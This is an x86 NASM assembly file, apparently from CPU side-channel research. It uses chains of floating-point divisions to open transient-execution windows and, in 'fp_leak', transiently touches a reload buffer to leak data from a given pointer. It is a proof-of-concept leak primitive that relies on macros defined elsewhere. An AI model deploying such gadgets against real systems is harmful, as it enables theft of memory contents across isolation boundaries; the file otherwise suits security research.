%include "common.S"

%define X_VAL   0x0010000000000000 | (2*LEAK_SIZE*STRIDE) 
%define Y_VAL   0x4000000000000000
%define FP_MASK (2*LEAK_SIZE*STRIDE)-1

section .data noexec write
    ;Memory for xmm backup
    align 64
    fp_regs:
    %rep 0x1000
    db  0x0
    %endrep

    align 64
    x:
    %rep 8
    dq X_VAL
    %endrep

    align 64
    y:
    %rep 8
    dq Y_VAL
    %endrep

section .text
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fp_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fp_win_size
align 64
fp_win_size:
    ;Backup used xmm registers
    movdqu  [fp_regs]   , xmm0 
    movdqu  [fp_regs+64], xmm1 
    SERIALIZE

%rep 1          ;TWEAK
    movsd   xmm0, [x]
    movsd   xmm1, [y]
    divsd   xmm0, xmm1
%endrep

    movq    rax, xmm0
    and     rax, FP_MASK
    add     rdi, rax
    LOADS   rdi

    ;Restore used xmm registers
    movdqu  xmm0, [fp_regs]
    movdqu  xmm1, [fp_regs+64]
    ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fp_win_size_branch(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fp_win_size_branch
align 64
fp_win_size_branch:
    ;Backup used xmm registers
    movdqu  [fp_regs]   , xmm0 
    movdqu  [fp_regs+64], xmm1 
    SERIALIZE

%rep 32         ;TWEAK
    movsd   xmm0, [x]
    movsd   xmm1, [y]
    divsd   xmm0, xmm1
%endrep
    movq    rax, xmm0
    and     rax, FP_MASK
    cmp     rax, 0
    jne     fp_win_size_branch_arch

fp_win_size_branch_spec:
    LOADS   rdi
    ud2

fp_win_size_branch_arch:
    ;Restore used xmm registers
    movdqu  xmm0, [fp_regs]
    movdqu  xmm1, [fp_regs+64]
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fp_leak(uint8_t *reload_buffer, uint8_t *ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global fp_leak
align 64
fp_leak:
    ;Backup used xmm registers
    movdqu  [fp_regs]   , xmm0 
    movdqu  [fp_regs+64], xmm1 

%rep    2       ;TWEAK
    movsd   xmm0, [x]
    movsd   xmm1, [y]
    divsd   xmm0, xmm1
%endrep

    movq    rax, xmm0
    and     rax, FP_MASK 
    add     rdi, rax
    LEAK    rdi, rsi

    ;Restore used xmm registers
    movdqu  xmm0, [fp_regs]
    movdqu  xmm1, [fp_regs+64]
    ret
